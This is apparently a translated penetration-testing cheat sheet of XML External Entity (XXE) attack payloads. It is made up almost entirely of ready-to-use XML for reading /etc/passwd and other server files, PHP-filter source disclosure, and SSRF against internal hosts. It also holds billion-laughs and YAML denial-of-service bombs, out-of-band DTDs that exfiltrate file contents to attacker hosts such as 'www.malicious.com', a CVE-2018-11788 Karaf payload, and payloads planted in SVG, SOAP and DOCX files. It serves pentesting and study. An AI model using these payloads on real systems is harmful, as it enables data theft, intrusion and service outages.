# XML External entity

> XML外部实体攻击是针对解析XML输入并允许XML实体的应用程序的攻击类型。XML实体可用于告诉XML解析器在服务器上获取特定内容。

**内部实体**：如果参数是在DTD中声明的，它被称为内部实体。

语法：`<！参数名称“参数值”>`

**外部实体**：如果参数在DTD外部声明，则称为外部实体。由“SYSTEM”标识。语法：`<！参数名称“参数值”>`

## 概要

- [Tools](#tools)
- [Detect the vulnerability](#detect-the-vulnerability)
- [Read file content](#read-file-content)
- [PHP Wrapper inside XXE](#php-wrapper-inside-xxe)
- [XXE to SSRF](#xxe-to-ssrf)
- [Deny of service](#deny-of-service)
- [Blind XXE - Out of Band](#blind-xxe---out-of-Band)
  - [Blind XXE](#blind-xxe)
  - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
  - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
  - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
- [XXE in exotic files](#xxe-in-exotic-files)
  - [XXE inside SVG](#xxe-inside-svg)
  - [XXE inside SOAP](#xxe-inside-soap)
  - [XXE inside DOCX file](#xxe-inside-docx-file)

## Tools

- [xxeftp](https://github.com/staaldraad/xxeserv)
  ```
  sudo ./xxeftp -uno 443 ./xxeftp -w -wps 5555
  ```
 - [230-OOB](https://github.com/lc/230-OOB) 以及通过 [http://xxe.sh/](http://xxe.sh/)
   
   ```
   $ python3 230.py 2121
   ```
   

### Detect the vulnerability

基本实体测试，当XML解析器解析外部实体时，结果应该在“firstName”中包含“John”，在“lastName”中包含“Doe”。实体是在“DOCTYPE”元素中定义的。

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

向服务器发送xml负载时，设置请求中的“Content Type:application/xml”可能会有帮助。

## Read file content

经典的XXE，我们试图显示文件`/etc/passwd的内容`

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

:warning:：SYSTEM和PUBLIC几乎是同义词。:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```


经典XXE Base64编码

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## PHP Wrapper inside XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

## XXE to SSRF

XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) to target another service on the network.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://secret.dev.company.com/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```


## Deny of service

:warning:: 这些攻击可能会杀死服务或服务器，不要在生产中使用它们。

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

Yaml 攻击

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## Blind XXE - Out of Band

有时，您不会在页面中输出结果，但仍然可以通过带外攻击提取数据。

###  Blind XXE

测试盲XXE的最简单方法是尝试加载远程资源，如Burp协作器。

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```


将`/etc/passwd`的内容发送到“www.malitive.com”，您可能只收到第一行。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### XXE OOB Attack (Yunusov, 2013)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://publicServer.com/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### XXE OOB with DTD and PHP filter

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://127.0.0.1/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

### XXE OOB with Apache Karaf

CVE-2018-11788 affecting versions:

- Apache Karaf <= 4.2.1
- Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

将XML文件发送到“deploy”文件夹。

参考文献[brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)

## XXE in exotic files

### XXE inside SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

### XXE inside SOAP

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### XXE inside DOCX file

打开的XML文件的格式（在任何.XML文件中插入负载）：

- /_rels/.rels
- [Content_Types].xml
- Default Main Document Part
  - /word/document.xml
  - /ppt/presentation.xml
  - /xl/workbook.xml

然后更新文件 `zip -u xxe.docx [Content_Types].xml`

Tool : https://github.com/BuffaloWill/oxml_xxe

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
```

## References

* [XML External Entity (XXE) Processing - OWASP](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing)
* [Detecting and exploiting XXE in SAML Interfaces - Von Christian Mainka](http://web-in-security.blogspot.fr/2014/11/detecting-and-exploiting-xxe-in-saml.html)
* [staaldraad - XXE payloads](https://gist.github.com/staaldraad/01415b990939494879b4)
* [mgeeky - XML attacks](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)
* [Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 Will Vandevanter - @_will_is_](https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf)
* [XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)](http://en.hackdig.com/08/28075.htm)
* [Understanding Xxe From Basic To Blind - 10/11/2018 - Utkarsh Agrawal](http://agrawalsmart7.com/2018/11/10/Understanding-XXE-from-Basic-to-Blind.html)
* [From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele](https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/)
* [How we got read access on Google’s production servers](https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/) by  detectify
* [Blind OOB XXE At UBER 26+ Domains Hacked](http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html) by Raghav Bisht
* [XXE through SAML](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
* [XXE in Uber to read local files](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
* [XXE by SVG in community.lithium.com](http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/)
* [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
* [Pentest XXE - @phonexicum](https://phonexicum.github.io/infosec/xxe.html)
